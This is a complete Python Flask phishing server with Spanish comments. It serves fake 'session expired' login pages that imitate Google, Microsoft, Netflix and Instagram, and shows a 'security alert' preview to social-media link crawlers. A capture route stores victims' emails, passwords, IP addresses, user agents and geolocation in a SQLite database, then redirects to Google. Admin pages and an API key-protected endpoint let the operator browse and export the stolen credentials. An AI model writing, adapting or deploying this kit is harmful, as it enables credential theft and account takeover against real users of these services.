#!/usr/bin/env python3
import os
import sqlite3
import json
import requests
import hashlib
import re
import logging
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, redirect, jsonify, abort, session

# Configurar logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Configuración de seguridad de sesión
app.secret_key = os.environ.get('SECRET_KEY', 'clave-secreta-para-session-12345')
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(hours=2)
)

# =============================================
# CONFIGURACIÓN SIMPLE
# =============================================
CONFIG = {
    'redirect_url': 'https://www.google.com',
    'template': 'google',
    'api_key': os.environ.get('API_KEY', 'smiclavesegura2026'),
    'admin_password': 'triple777'
}

def load_config():
    try:
        with open('config.json', 'r') as f:
            CONFIG.update(json.load(f))
    except:
        pass

def init_db():
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                ip TEXT,
                username TEXT,
                password TEXT,
                user_agent TEXT,
                referer TEXT,
                geo_location TEXT
            )
        ''')
        conn.commit()
        conn.close()
        logger.info("Base de datos inicializada correctamente")
    except Exception as e:
        logger.error(f"Error al inicializar la base de datos: {e}")

def get_client_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in str(ip):
        ip = ip.split(',')[0].strip()
    return ip

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city", timeout=3).json()
        if r.get('status') == 'success':
            return f"{r.get('city', 'Unknown')}, {r.get('country', 'Unknown')}"
    except Exception as e:
        logger.warning(f"Error al obtener geolocalización para {ip}: {e}")
    return "Unknown"

def is_social_crawler(ua):
    social_bots = ['facebookexternalhit', 'twitterbot', 'whatsapp', 'linkedinbot', 
                   'telegrambot', 'discord', 'slackbot', 'pinterest', 'redditbot']
    return any(bot in ua.lower() for bot in social_bots)

def get_template(name='google'):
    templates = {
        'google': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Verificación de seguridad</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif}
        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:100%;max-width:440px;text-align:center}
        .logo{width:75px;margin-bottom:20px}
        h1{font-size:24px;font-weight:500;margin-bottom:10px;color:#202124}
        p{color:#5f6368;margin-bottom:25px;font-size:14px}
        .security-badge{background:#e8f0fe;color:#1a73e8;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
        input{width:100%;padding:14px 16px;margin-bottom:14px;border:1px solid #dadce0;border-radius:8px;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#1a73e8;box-shadow:0 0 0 3px rgba(26,115,232,0.2)}
        button{width:100%;padding:14px;background:#1a73e8;color:white;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s}
        button:hover{background:#1557b0;transform:translateY(-2px);box-shadow:0 4px 12px rgba(26,115,232,0.3)}
        .footer{margin-top:25px;font-size:13px;color:#5f6368}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
        <div class="security-badge">🔒 Verificación de seguridad</div>
        <h1>Tu sesión ha expirado</h1>
        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Continuar</button>
        </form>
        <div class="footer">🔐 Conexión segura</div>
    </div>
</body>
</html>''',
        
        'microsoft': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Verificación de seguridad</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:100%;max-width:440px;text-align:center}
        .logo{width:108px;margin-bottom:20px}
        h1{font-size:24px;font-weight:600;margin-bottom:10px;color:#1b1b1b}
        p{color:#5f6368;margin-bottom:25px;font-size:14px}
        .security-badge{background:#e8f0fe;color:#0067b8;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
        input{width:100%;padding:14px 16px;margin-bottom:14px;border:1px solid #ccc;border-radius:8px;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#0067b8;box-shadow:0 0 0 3px rgba(0,103,184,0.2)}
        button{width:100%;padding:14px;background:#0067b8;color:white;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s}
        button:hover{background:#005a9e;transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,103,184,0.3)}
        .footer{margin-top:25px;font-size:13px;color:#5f6368}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
        <div class="security-badge">🔒 Verificación de seguridad</div>
        <h1>Tu sesión ha expirado</h1>
        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Correo, teléfono o Skype" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <div class="footer">🔐 Conexión segura</div>
    </div>
</body>
</html>''',
        
        'netflix': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Verificación de seguridad</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',sans-serif}
        body{background:linear-gradient(135deg,#141414 0%, #000000 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.8);width:100%;max-width:440px;text-align:center}
        h1{color:white;font-size:28px;margin-bottom:10px;font-weight:700}
        p{color:#999;margin-bottom:25px;font-size:14px}
        .security-badge{background:#e50914;color:white;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
        input{width:100%;padding:14px 16px;margin-bottom:14px;background:#333;border:1px solid #555;border-radius:8px;color:white;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#e50914;box-shadow:0 0 0 3px rgba(229,9,20,0.2)}
        input::placeholder{color:#888}
        button{width:100%;padding:14px;background:#e50914;color:white;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s}
        button:hover{background:#f40612;transform:translateY(-2px);box-shadow:0 4px 12px rgba(229,9,20,0.4)}
        .footer{margin-top:25px;font-size:13px;color:#666}
    </style>
</head>
<body>
    <div class="container">
        <h1 style="font-size:40px;font-family:'Helvetica Neue',sans-serif;margin-bottom:30px;">NETFLIX</h1>
        <div class="security-badge">🔒 Verificación de seguridad</div>
        <h1>Tu sesión ha expirado</h1>
        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <div class="footer">🔐 Conexión segura</div>
    </div>
</body>
</html>''',
        
        'instagram': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Verificación de seguridad</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,sans-serif}
        body{background:linear-gradient(135deg,#fafafa 0%, #e0e0e0 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:white;border:1px solid #dbdbdb;padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.1);width:100%;max-width:400px;text-align:center}
        .logo{font-size:44px;font-family:'Brush Script MT',cursive;margin-bottom:20px}
        h1{font-size:24px;font-weight:600;margin-bottom:10px;color:#262626}
        p{color:#8e8e8e;margin-bottom:25px;font-size:14px}
        .security-badge{background:#e8f0fe;color:#0095f6;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
        input{width:100%;padding:14px 16px;margin-bottom:14px;background:#fafafa;border:1px solid #dbdbdb;border-radius:8px;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#0095f6;box-shadow:0 0 0 3px rgba(0,149,246,0.2)}
        button{width:100%;padding:14px;background:#0095f6;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s}
        button:hover{background:#0081d6;transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,149,246,0.3)}
        .footer{margin-top:25px;font-size:13px;color:#8e8e8e}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <div class="security-badge">🔒 Verificación de seguridad</div>
        <h1>Tu sesión ha expirado</h1>
        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
        <form action="/capture" method="POST">
            <input type="text" name="email" placeholder="Teléfono, usuario o correo" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <div class="footer">🔐 Conexión segura</div>
    </div>
</body>
</html>'''
    }
    return templates.get(name, templates['google'])

@app.after_request
def add_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    if request.path == '/' or request.path == '/capture':
        response.headers['Content-Security-Policy'] = (
            "default-src 'self'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' https://www.google.com https://i.imgur.com https://aadcdn.msftauth.net; "
            "font-src 'self' https://fonts.gstatic.com; "
            "form-action 'self'; "
            "frame-ancestors 'none'"
        )
    return response

@app.before_request
def handle_bots():
    ua = request.headers.get('User-Agent', '')
    if is_social_crawler(ua) and request.path == '/':
        return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <meta property="og:url" content="https://video-xeen.onrender.com/">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <title>Alerta de seguridad</title>
</head>
<body>
    <h1>Alerta de seguridad</h1>
    <p>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</p>
</body>
</html>
'''), 200

@app.route('/')
def index():
    return render_template_string(get_template(CONFIG.get('template', 'google')))

@app.route('/capture', methods=['POST'])
def capture():
    ip = get_client_ip()
    username = request.form.get('email', '') or request.form.get('username', '')
    password = request.form.get('password', '')
    
    if not username or not password:
        return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
    
    geo = get_geo(ip)
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (datetime.now().isoformat(), ip, username, password,
              request.headers.get('User-Agent', ''), request.headers.get('Referer', ''), geo))
        conn.commit()
        conn.close()
        logger.info(f"✅ Credencial guardada: {username} desde {ip}")
    except Exception as e:
        logger.error(f"❌ Error al guardar: {e}")
    
    return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))

@app.route('/login-credenciales', methods=['GET', 'POST'])
def login_credenciales():
    if request.method == 'POST':
        if request.form.get('password') == CONFIG.get('admin_password', 'triple777'):
            session['admin_logged'] = True
            return redirect('/ver-credenciales')
        else:
            return "<h1>❌ Contraseña incorrecta</h1><a href='/login-credenciales'>Volver</a>"
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Acceso Admin</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
            body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
            h1 { color: #1a73e8; margin-bottom: 20px; }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
            button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
            button:hover { background: #1557b0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔐 Acceso Admin</h1>
            <form method="POST">
                <input type="password" name="password" placeholder="Contraseña" required>
                <button type="submit">Acceder</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/ver-credenciales')
def ver_credenciales():
    if not session.get('admin_logged'):
        return redirect('/login-credenciales')
    
    conn = sqlite3.connect('credentials.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT id, timestamp, ip, username, password, geo_location FROM credentials ORDER BY id DESC')
    rows = cursor.fetchall()
    conn.close()
    
    if not rows:
        return "<h1>📭 No hay credenciales</h1><a href='/login-credenciales'>Volver</a>"
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Credenciales</title>
        <style>
            body { font-family: Arial; background: #f0f2f5; padding: 20px; }
            h1 { color: #1a73e8; text-align: center; }
            table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            th { background: #1a73e8; color: white; padding: 12px; text-align: left; }
            td { padding: 10px; border-bottom: 1px solid #ddd; }
            tr:hover { background: #f5f5f5; }
            .logout { float: right; background: #dc3545; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none; }
            .logout:hover { background: #c82333; }
        </style>
    </head>
    <body>
        <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
        <h1>🔐 Credenciales Capturadas</h1>
        <p>Total: <strong>""" + str(len(rows)) + """</strong></p>
        <table>
            <tr><th>ID</th><th>Fecha</th><th>IP</th><th>Ubicación</th><th>Usuario</th><th>Contraseña</th></tr>
    """
    
    for r in rows:
        html += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[5]}</td><td>{r[3]}</td><td><strong>{r[4]}</strong></td></tr>"
    
    html += """
        </table>
    </body>
    </html>
    """
    return html

@app.route('/logout-credenciales')
def logout_credenciales():
    session.pop('admin_logged', None)
    return redirect('/login-credenciales')

@app.route('/api/credentials')
def api_credentials():
    key = request.headers.get('X-API-Key')
    if key != CONFIG.get('api_key'):
        abort(401)
    
    conn = sqlite3.connect('credentials.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM credentials ORDER BY id DESC')
    data = cursor.fetchall()
    conn.close()
    return jsonify(data)

if __name__ == '__main__':
    load_config()
    init_db()
    port = int(os.environ.get('PORT', 8080))
    print(f"[+] Servidor iniciado en puerto {port}")
    print(f"[+] Contraseña admin: triple777")
    print(f"[+] API Key: {CONFIG.get('api_key')}")
    app.run(host='0.0.0.0', port=port, debug=False)
